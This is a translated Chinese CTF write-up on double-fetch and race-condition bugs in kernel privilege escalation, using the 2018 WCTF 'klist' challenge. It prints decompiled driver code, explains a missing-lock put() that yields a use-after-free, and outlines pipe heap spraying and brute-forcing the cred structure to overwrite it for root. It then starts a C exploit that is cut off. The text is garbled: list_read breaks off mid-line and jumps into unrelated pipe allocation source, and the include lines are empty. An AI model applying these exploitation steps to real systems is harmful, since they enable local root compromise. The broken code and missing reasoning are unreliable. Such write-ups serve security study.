# 条件竞争在Kernel提权中的应用
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## Double-Fetch漏洞简介
随着多核`CPU`硬件的普及，并行程序被越来越广泛地使用，尤其是在操作系统、实时系统等领域。然而并行程序将会引入并发错误，例如多个线程都将访问一个共享的内存地址。如果其中一个恶意线程修改了该共享内存，则会导致其他线程得到恶意数据，这就导致了一个数据竞争漏洞。数据竞争极易引发并发错误，包括死锁，原子性违例(`atomicity
violation`)，顺序违例(`order violation`)等。当并发错误可以被攻击者利用时，就形成了并发漏洞。  
当内核与用户线程发生了竞争，则产生了`double
fetch`漏洞。如上图所示，用户态进程通过调用内核函数来访问内核数据，但是如果内核函数同时也会读取该内核数据时，则会产生一种漏洞情况。例如当内核数据第一次取该数据进行检查，然后检查通过后会第二次取该数据进行使用。而如果在第一次通过检查后，用户态进程修改了该数据，即会导致内核第二次使用该数据时，数据发生改变，则会造成包括缓冲区溢出、信息泄露、空指针引用等漏洞。
下面以两道题目讲述 `Double-Fetch`常见的漏洞点和常见的攻击方法。
## 2018-WCTF-klist
###  漏洞分析
    __int64 __fastcall add_item(__int64 a1)
    {
      __int64 chunk; // rax
      __int64 size; // rdx
      __int64 data; // rsi
      __int64 v4; // rbx
      __int64 v5; // rax
      __int64 result; // rax
      __int64 v7[3]; // [rsp+0h] [rbp-18h] BYREF
      if ( copy_from_user(v7, a1, 16LL) || v7[0] > 0x400uLL )
        return -22LL;
      chunk = _kmalloc(v7[0] + 24, 21103296LL);
      size = v7[0];
      data = v7[1];
      *(_DWORD *)chunk = 1;
      v4 = chunk;
      *(_QWORD *)(chunk + 8) = size;
      if ( copy_from_user(chunk + 24, data, size) )
      {
        kfree(v4);
        result = -22LL;
      }
      else
      {
        mutex_lock(&list_lock);
        v5 = g_list;
        g_list = v4;
        *(_QWORD *)(v4 + 16) = v5;
        mutex_unlock(&list_lock);
        result = 0LL;
      }
      return result;
    }
`Add`函数，可以通过`kmalloc`申请一个堆块，并且将堆块的前`0x18`当作一个管理结构，如下所示：
    0x0-0x8             flag
    0x8-0x10:            size
    0x10-0x18：        next
其中`flag`用于标记当前堆块的使用次数，`size`为大小，`next`指向下一个堆块。并且当将堆块插入`g_list`链表时，首先会调用互斥锁，将堆块插入后，再解锁。
    __int64 __fastcall select_item(__int64 a1, __int64 a2)
    {
      __int64 v2; // rbx
      __int64 v3; // rax
      volatile signed __int32 **v4; // rbp
      mutex_lock(&list_lock);
      v2 = g_list;
      if ( a2 > 0 )
      {
        if ( !g_list )
        {
    LABEL_8:
          mutex_unlock(&list_lock);
          return -22LL;
        }
        v3 = 0LL;
        while ( 1 )
        {
          ++v3;
          v2 = *(_QWORD *)(v2 + 16);
          if ( a2 == v3 )
            break;
          if ( !v2 )
            goto LABEL_8;
        }
      }
      if ( !v2 )
        return -22LL;
      get((volatile signed __int32 *)v2);
      mutex_unlock(&list_lock);
      v4 = *(volatile signed __int32 ***)(a1 + 200);
      mutex_lock(v4 + 1);
      put(*v4);
      *v4 = (volatile signed __int32 *)v2;
      mutex_unlock(v4 + 1);
      return 0LL;
    }
`select`用于从 `g_list`中选择需要的堆块，并放入 `file+200`处。而且放入时，也会先检查互斥锁，然后再解锁。这里还有一个
`get`和 `put`函数，分别如下：
    void __fastcall get(volatile signed __int32 *a1)
    {
      _InterlockedIncrement(a1);
    }
    __int64 __fastcall put(volatile signed __int32 *a1)
    {
      __int64 result; // rax
      if ( a1 )
      {
        if ( !_InterlockedDecrement(a1) )
          result = kfree();
      }
      return result;
    }
`get`用于将堆块的 `flag`加1。`put`用于将堆块的`flag`减1，并且判断当堆块的 `flag`为0时，则将该堆块
`free`掉。这里都是原子操作，不存在竞争。
    __int64 __fastcall remove_item(__int64 a1)
    {
      __int64 list_head; // rax
      __int64 v2; // rdx
      __int64 v3; // rdi
      volatile signed __int32 *v5; // rdi
      if ( a1 >= 0 )
      {
        mutex_lock(&list_lock);
        if ( !a1 )
        {
          v5 = (volatile signed __int32 *)g_list;
          if ( g_list )
          {
            g_list = *(_QWORD *)(g_list + 16);
            put(v5);
            mutex_unlock(&list_lock);
            return 0LL;
          }
          goto LABEL_12;
        }
        list_head = g_list;
        if ( a1 != 1 )
        {
          if ( !g_list )
          {
    LABEL_12:
            mutex_unlock(&list_lock);
            return -22LL;
          }
          v2 = 1LL;
          while ( 1 )
          {
            ++v2;
            list_head = *(_QWORD *)(list_head + 16);
            if ( a1 == v2 )
              break;
            if ( !list_head )
              goto LABEL_12;
          }
        }
        v3 = *(_QWORD *)(list_head + 16);
        if ( v3 )
        {
          *(_QWORD *)(list_head + 16) = *(_QWORD *)(v3 + 16);
          put((volatile signed __int32 *)v3);
          mutex_unlock(&list_lock);
          return 0LL;
        }
        goto LABEL_12;
      }
      return -22LL;
    }
`Remove`操作，是将选择的堆块，从 `g_list`链表中移除，并且会对堆块的 `flag`减1。
    unsigned __int64 __fastcall list_head(__int64 a1)
    {
      __int64 head; // rbx
      unsigned __int64 v2; // rbx
      mutex_lock(&list_lock);
      get((volatile signed __int32 *)g_list);
      head = g_list;
      mutex_unlock(&list_lock);
      v2 = -(__int64)(copy_to_user(a1, head, *(_QWORD *)(head + 8) + 24LL) != 0) & 0xFFFFFFFFFFFFFFEALL;
      put((volatile signed __int32 *)g_list);
      return v2;
    }
`list_head`操作是先调用互斥锁，再从 `g_list`取出链表头堆块，再调用解锁。输出给用户，然后调用 put函数。
注意：我们查看每一次`put`操作，发现上面调用 `put`和 `get`时，都会调用互斥锁。而这里 在
put时却没有调用互斥锁。也就是存在了一个条件竞争漏洞。我们可以在执行 put函数之前，执行其他函数获得互斥锁，来构造一个条件竞争漏洞。
    __int64 __fastcall list_read(__int64 a1, __int64 a2, unsigned __int64 a3)
    {
      __int64 *v5; // r13
      __int64 v6; // rsi
      _QWORD *v7; // rdi
      __int64 result; // rax
      v5 = *(__int64 **)(a1 + 200);
      mutex_lock(v5 + 1);
      v6 = *v5;
      if ( *v5 )
      {
        if ( *(_QWORD *)(v6 + 8) bufs = kzalloc(sizeof(struct pipe_buffer) * pipe_bufs, GFP_KERNEL);  
    // v4.18.4
    unsigned long pipe_bufs = PIPE_DEF_BUFFERS;
    pipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),GFP_KERNEL_ACCOUNT);
        //kcalloc最终还是调用kmalloc分配了 n*size 大小的堆空间
            //static inline void *kcalloc(size_t n, size_t size, gfp_t flags)
可以看到 `pipe`函数也是通过`kzalloc`实现，而
`kzalloc`就是加了一个将`kmalloc`后的堆块清空。所以也是`kmalloc`函数，那么只要`size`恰当，那么就一定能够将我们上面`uaf`的
`new_chunk_head`堆块申请出来，并写上数据。
那么利用pipe函数堆喷，就能够实现对 `uaf`的 `new_chunk_head`的`size`的修改。这里的选择当然不止
`pipe`函数，其他堆喷方法可参考[这篇文章](https://www.anquanke.com/post/id/204319)。
**覆写cred**
得到任意地址读写的能力后，提权的方法其实有几种。覆写`cred`、修改 `vdso`、修改`prctl`、修改 `modprobe_path`，但是除了
覆写 `cred`，另外几种都需要知道内核地址。这里无法泄露地址。
那么，直接选择爆破 `cred`地址，然后将其 覆写为 0提权。这里选择爆破的标志位是 `uid~fsgid`在普通权限下都为
`1000(0x3e8)`。所以只要寻找到这个，就能确定 `cred`与 `new_chunk_head`的偏移。
这里我尝试了使用常用的设置 `PR_SET_NAME`,然后爆破寻找
该字符串地址，以此得到`cred`地址。但是结果是，爆破了很久在爆破出结果后，就卡住了，无法进行下一步。而调试的时候，竟然发现
子线程会一直循环执行，这点是我目前还没有考虑清楚的问题。
###  EXP
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int fd;
    typedef struct List{
        size_t size;
        char* buf;
    }klist;
    void ErrPro(char* buf){
        printf("Error %s\n",buf);
        exit(-1);
    }
    void Add(size_t sz, char* buffer){
        klist* list = malloc(sizeof(klist));
        list->size = sz-0x18;
        list->buf = buffer;  
        if(0 < ioctl(fd, 0x1337, list)){
            ErrPro("Add");
        }
    }
    void Select(size_t num){